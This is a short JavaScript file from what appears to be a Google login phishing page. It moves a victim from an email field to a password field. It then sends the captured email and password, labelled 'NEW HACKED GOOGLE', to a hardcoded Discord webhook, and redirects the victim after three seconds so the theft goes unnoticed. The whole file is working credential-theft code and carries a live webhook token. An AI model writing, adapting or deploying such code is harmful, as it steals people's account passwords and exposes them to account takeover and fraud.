function next() {
  console.log('got the email');
  var email = document.getElementById("email").value;
  location.replace('pass.html?email=' + email);
}

function submit() {
  var queryParams = getQueryParams();
  var email = queryParams.email;
  var password = document.getElementById("password").value;

  function message() {
    const webhook = "https://discord.com/api/webhooks/1405222929280798850/RtVRdTHHV_CjyWvrpjhPhFRohEqCA-ORbT0VPcmg-vO7pzrbj04E_M1-gPTH4ZXMyACB";

    const contents = `NEW HACKED GOOGLE\n\nEmail: ${email}\nPassword: ${password}`;
    const request = new XMLHttpRequest();
    request.open("POST", webhook);
    request.setRequestHeader('Content-type', 'application/json');
    const params = {
      content: contents
    }
    request.send(JSON.stringify(params));
  }

  message();
  wait();
}

function getQueryParams() {
  var params = {};
  var search = window.location.search.substring(1);
  if (search) {
    var pairs = search.split('&');
    for (var i = 0; i < pairs.length; i++) {
      var pair = pairs[i].split('=');
      params[pair[0]] = decodeURIComponent(pair[1] || '');
    }
  }
  return params;
}

function wait() {
  setTimeout(() => {
    location.replace('test.html');
  }, 3000);
}
